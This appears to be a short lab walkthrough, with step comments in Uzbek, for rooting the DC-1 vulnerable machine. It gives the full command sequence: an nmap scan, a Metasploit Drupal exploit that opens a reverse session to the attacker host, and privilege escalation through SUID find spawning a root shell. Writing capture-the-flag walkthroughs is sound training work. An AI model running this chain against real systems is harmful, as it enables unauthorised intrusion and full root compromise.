# DC-1-VulnLab-
DC-1 VulnLab Walkthrough (Metasploit + Manual Privilege Escalation)

> Lab: DC-1
> Goal: Gain root access

---

# 1️⃣ Port scan
nmap -sC -sV 192.168.56.101

# 2️⃣ Web tekshirish
http://192.168.56.101

# 3️⃣ Metasploit ishga tushirish
msfconsole -q

# 4️⃣ Drupal exploit qidirish
search drupal

# 5️⃣ Modul tanlash (misol uchun 1 chiqsa)
use 1

# 6️⃣ Parametrlarni ko‘rish
show options

# 7️⃣ Target IP qo‘yish
set RHOSTS 192.168.56.101

# 8️⃣ Attacker IP qo‘yish
set LHOST 192.168.56.1

# 9️⃣ Exploit ishga tushirish
run

# 10️⃣ Sessionga kirish (agar ochilsa)
sessions

sessions -i 1

# 11️⃣ Shellga o‘tish
shell

# 12️⃣ User tekshirish
whoami

# 13️⃣ SUID fayllarni qidirish
find / -perm -4000 -type f 2>/dev/null

# 14️⃣ find permission tekshirish
ls -l /usr/bin/find

# 15️⃣ Privilege escalation (SUID find orqali)
/usr/bin/find . -exec /bin/sh \; -quit

# 16️⃣ Root tekshirish
whoami

# 17️⃣ Flag olish
cd /root
ls
cat thefinalflag.txt
